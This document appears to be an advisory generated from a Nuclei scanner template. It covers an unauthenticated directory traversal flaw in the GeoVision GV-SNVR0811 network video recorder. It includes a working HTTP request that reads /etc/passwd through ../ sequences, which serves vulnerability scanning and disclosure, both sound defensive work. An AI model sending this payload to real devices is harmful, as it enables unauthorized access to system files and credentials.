# Nuclei Template: GeoVision GV-SNVR0811 - Directory Traversal
**Template ID:** geovision-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`geovision-lfi.yaml`)

## Vulnerability Information & PoC

## Description
The GeoVision GV-SNVR0811 network video recorder is vulnerable to a Directory Traversal vulnerability, which allows unauthenticated remote attackers to access arbitrary files on the device by manipulating the file path in HTTP requests (e.g., using ../ sequences).

## Impact
This could lead to unauthorized access to sensitive files, including system configurations, credentials, or other critical information.

## Steps to reproduce / Exploit Payload
```http
GET /../../../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.exploit-db.com/exploits/45065
